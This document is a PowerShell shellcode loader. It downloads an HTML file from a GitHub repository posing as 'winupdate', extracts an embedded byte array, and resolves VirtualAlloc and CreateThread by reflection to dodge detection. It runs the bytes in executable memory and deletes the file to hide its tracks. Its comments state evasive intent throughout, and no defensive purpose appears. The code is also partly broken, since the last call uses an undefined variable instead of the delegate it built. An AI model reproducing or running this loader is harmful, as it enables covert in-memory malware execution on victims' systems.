# 1. Paths and URLs
$htmlPath = "$env:TEMP\test.html" # Using TEMP is less suspicious than Downloads
$htmlUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"

# 2. Download the HTML Blob
Invoke-WebRequest -Uri $htmlUrl -OutFile $htmlPath -UseBasicParsing

# 3. Extract and Reassemble the Byte Array
$htmlContent = Get-Content $htmlPath -Raw
$pattern = '(?<=dmr)(.*?)(?=dmr)'
$match = [regex]::Match($htmlContent, $pattern).Value
$byteArray = $match.Split("dmr") | ForEach-Object { [byte]$_ }

# 4. The Shellcode Loader (Runs in RAM)
$Ptr = [System.Runtime.InteropServices.Marshal]
$Win32Func = [Ref].Assembly.GetType('Microsoft.Win32.Win32Native')
$GetProcAddress = $Win32Func.GetMethod('GetProcAddress', [Reflection.BindingFlags] 'Static, NonPublic')
$GetModuleHandle = $Win32Func.GetMethod('GetModuleHandle', [Reflection.BindingFlags] 'Static, NonPublic')

# 2. Find VirtualAlloc and CreateThread manually
$Kern32 = $GetModuleHandle.Invoke($null, @("kernel32.dll"))
$VAllocAddr = $GetProcAddress.Invoke($null, @($Kern32, "VirtualAlloc"))
$CThreadAddr = $GetProcAddress.Invoke($null, @($Kern32, "CreateThread"))

# 3. Create delegates to call them (This avoids Add-Type)
$VAllocDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAllocAddr, [Func[IntPtr, UInt32, UInt32, UInt32, IntPtr]])
$CThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CThreadAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])

# 4. Use the delegates
$size = [uint32]$byteArray.Length
$address = $VAllocDelegate.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40)

# Copy Shellcode to Allocated Memory
[System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $address, $size)

# Execute the Shellcode as a new Thread
$kernel32::CreateThread([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Cleanup the HTML file to hide tracks
Remove-Item $htmlPath -Force
